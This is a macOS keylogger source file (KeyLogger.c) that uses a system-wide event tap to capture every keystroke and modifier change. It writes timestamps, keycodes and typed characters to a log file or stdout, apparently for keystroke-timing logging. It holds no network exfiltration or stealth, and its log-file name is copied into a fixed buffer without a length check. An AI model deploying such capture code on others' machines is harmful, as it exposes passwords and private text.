//  KeyLogger.c
//
//  Created by Juha Koivisto on 27.2.2011.
//  Copyright 2011 J. Koivisto S.A.C. All rights reserved.
//
//	Modified by Yoshiki Vazquez Baeza on October 22, 2013
//

#import "KeyLogger.h"

void readLogFileName(char* pLogFileName2){
	NSBundle*	mainBundle;
	NSString*	logFileNameNS;
	unsigned long fnLen;

	// memory management, construct pool
	@autoreleasepool {

	// mainBundle == Info.plist
	mainBundle = [NSBundle mainBundle];

	// read Log file name
	logFileNameNS = [mainBundle objectForInfoDictionaryKey:@"logFile"];

	// to cString
	const char *pLocalLogFileName = [logFileNameNS UTF8String];

	// copy it to correct pointer (TODO: this could be smarter)
	fnLen = strlen(pLocalLogFileName) + 1;
	strncpy(pLogFileName2, pLocalLogFileName, sizeof(char)*fnLen);

	}
}

FILE* openLogFile(){
	FILE*		pLogFile;
	char      pLogFileName[65536];

	readLogFileName(pLogFileName);

	if (pLogFileName[0] == 's' &&
		pLogFileName[1] == 't' &&
		pLogFileName[2] == 'd' &&
		pLogFileName[3] == 'o' &&
		pLogFileName[4] == 'u' &&
		pLogFileName[5] == 't'){
		pLogFile = stdout;
	}
	else {
		pLogFile = fopen(pLogFileName, "a");
	}

	return pLogFile;
}

void printToLog(CGEventTimestamp*	pTimeStamp,
				uint*				pType,
				long long*			pKeycode,
				UniChar*			pUc,
				UniCharCount*		pUcc,
				CGEventFlags*		pFlags,
				FILE*				pLogFile){
	// print key open
	fprintf(pLogFile, "<key>");
	// print time
	fprintf(pLogFile, "<time>%llu</time>", *pTimeStamp);
	// print type
	fprintf(pLogFile, "<type>%u</type>", *pType);
	// print keycode
	fprintf(pLogFile, "<keycode>%lld</keycode>", *pKeycode);
	// print unichar
	if (pUc[0] != 0)
		fprintf(pLogFile, "<unichar>%04x</unichar>", pUc[0]);
	// print flags
	fprintf(pLogFile, "<flags>%llu</flags>", *pFlags);
	// print ascii (if alphanum)
	if ((pUc[0] < 128) && (pUc[0] >= 41))
		fprintf(pLogFile, "<ascii>%c</ascii>", pUc[0]);
	// print key close
	fprintf(pLogFile, "</key>\n");

}

CGEventRef recordKeysCallback(CGEventTapProxy	proxy,
							  CGEventType		type,
							  CGEventRef		event,
							  void*				pLogFile){
	/*
	 if (type == kCGEventFlagsChanged)
	 {
	 printf("flags changed\n");
	 long long keycode;
	 keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
	 printf("%lld", keycode);

	 }
	 */

	// only key up, key down and flagsChanged -events
	// you can do this also with mask
	// flagsChanged is for modifierkeys
	if (type != kCGEventKeyDown)
	{
		if (type != kCGEventKeyUp)
		{
			if (type != kCGEventFlagsChanged) return event;
		}
	}

	//unsigned long long	currentTime;
	CGEventTimestamp	timeStamp;	// unsigned long long
	long long			keycode;
	UniChar				uc[10];
	UniCharCount		ucc;
	CGEventFlags		flags;		// unsigned long long

	//currentTime = mach_absolute_time();
	timeStamp = CGEventGetTimestamp(event);
	keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
	CGEventKeyboardGetUnicodeString(event,10,&ucc,uc);
	flags = CGEventGetFlags (event);

	printToLog(&timeStamp, &type, &keycode, uc, &ucc, &flags, pLogFile);

	return event;
}

void createEventListenerLoopSourceAndRun(FILE* pLogFile){
	CFMachPortRef		eventTap;
	CFRunLoopSourceRef	runLoopSource;

	// create event listener
	eventTap = CGEventTapCreate(kCGHIDEventTap,
								kCGHeadInsertEventTap,
								0,
								kCGEventMaskForAllEvents,
								recordKeysCallback,   // <-- this is the function called
								(void*)pLogFile);

	// wrap event listener to loopable form
	runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault,
												  eventTap,
												  0);
	// add wrapped listener to loop
	CFRunLoopAddSource(CFRunLoopGetCurrent(),
					   runLoopSource,
					   kCFRunLoopCommonModes);

	// enable event tab
	CGEventTapEnable(eventTap,
					 true);

	// run event tab
	CFRunLoopRun();
}
